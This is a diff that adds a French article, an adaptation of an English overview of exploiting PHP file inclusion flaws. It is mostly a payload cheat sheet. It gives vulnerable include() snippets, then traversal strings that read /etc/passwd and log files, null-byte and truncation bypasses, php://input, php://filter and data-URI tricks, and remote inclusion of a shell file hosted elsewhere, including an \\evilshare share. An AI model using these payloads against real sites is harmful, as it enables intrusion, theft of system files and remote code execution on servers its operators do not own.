@@ -1,0 +1,134 @@
+http://www.techbrunch.fr/securite/maitriser-la-faille-php-include/
+https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
+ftp://hackbbs.org/Hacking/Faille-include.pdf
+LFI
+
+La faille include reste une faille assez courante et si elle est exploité de manière intelligente elle peut devenir très dangereuse. Cet article présente les différentes façon d’exploiter une faille de type “File inclusion”.
+Inclusion Locale Basique (LFI)
+
+&lt;?php include("includes/" . $_GET['file']); ?&gt;
+1
+	
+&lt;?php include("includes/" . $_GET['file']); ?&gt;
+
+    Inclure un fichier situé dans le même répertoire:
+
+?file=.htaccess
+
+    Inclure un fichier situé dans un répertoire différent:
+
+?file=../../../../../../../../../var/lib/locate.db
+
+(ce fichier est particulièrement intéressant car il permet de chercher dans les fichiers systèmes, autres fichiers intéressants)
+
+    Injecter du code PHP:
+
+?file=../../../../../../../../../var/log/apache/error.log
+
+(Il est possible d’inclure du code PHP en se servant des logs.Il est possible de trouver d’autre répertoires Apache  ici et d’autres ici. D’autre type de log peuvent être utilisés, upload de fichier, fichier de session, logs de connexion ssh etc.). Les fichiers temporaires peuvent aussi marcher.
+Inclusion Locale limitée (LFI)
+
+&lt;?php include("includes/" . $_GET['file'] . ".htm"); ?&gt;
+1
+	
+&lt;?php include("includes/" . $_GET['file'] . ".htm"); ?&gt;
+
+    Injection du caratère Null Byte:
+
+?file=../../../../../../../../../etc/passwd%00
+
+(requiert magic_quotes_gpc=off)
+
+    Listing des répertoires en utilisant le Null Byte:
+
+?file=../../../../../../../../../var/www/accounts/%00
+
+(Types de fichiers UFS seulement, requiert magic_quotes_gpc=off, plus de détails ici)
+
+    Path Truncation:
+
+?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …
+
+(plus de détails ici and ici)
+
+    Dot Truncation:
+
+?file=../../../../../../../../../etc/passwd……………. …
+
+(Windows suelement, plus de détails ici)
+
+    Reverse Path Truncation:
+
+?file=../../../../ […] ../../../../../etc/passwd
+
+(plus de détails ici)
+Inclusion de fichier distant basique (RFI)
+
+&lt;?php include($_GET['file']); ?&gt;
+1
+	
+&lt;?php include($_GET['file']); ?&gt;
+
+    Injection de code PHP:
+
+?file=[http|https|ftp]://websec.wordpress.com/shell.txt
+
+(requiert allow_url_fopen=On et allow_url_include=On)
+
+    Utilisation de PHP stream php://input:
+
+?file=php://input
+
+(specify your payload in the POST parameters, watch urlencoding, détails ici, requiert allow_url_include=On)
+
+    Utilisation de PHP stream php://filter:
+
+?file=php://filter/convert.base64-encode/resource=index.php
+
+(Permet de lire le code source de fichier PHP car le code est encodé en base64. Plus de détails ici et ici)
+
+    Utilisation des data URIs:
+
+?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+
+(requiert allow_url_include=On)
+
+    En utilisant une faille XSS:
+
+?file=http://127.0.0.1/path/xss.php?xss=phpcode
+
+(utile s’il existe un pare-feu ou que seul certains domaine sont autorisés)
+Inclusion de fichier distant limitée (RFI)
+
+&lt;?php include($_GET['file'] . ".htm"); ?&gt;
+1
+	
+&lt;?php include($_GET['file'] . ".htm"); ?&gt;
+
+    ?file=http://websec.wordpress.com/shell
+
+    ?file=http://websec.wordpress.com/shell.txt?
+
+    ?file=http://websec.wordpress.com/shell.txt%23
+
+(requiert allow_url_fopen=On et allow_url_include=On)
+
+    ?file=\\evilshare\shell.php
+
+(bypasse allow_url_fopen=Off)
+Inclusion de fichier statique
+
+<pre lang="php">&lt;?php include("http://192.168.1.10/config.php"); ?&gt;
+1
+	
+<pre lang="php">&lt;?php include("http://192.168.1.10/config.php"); ?&gt;
+
+    Man In The Middle(souvent oublié)
+
+Contourner les filtres
+
+    Utilisation de “Joker” (en savoir plus ici)
+
+Bien sûr il est possible de combiner ces différentes techniques. Si vous êtes au courant d’autres techniques n’hésitez pas à laisser un commentaire.
+
+Cet article est une adaptation de l’article suivant : Exploiting PHP File Inclusion – Overview
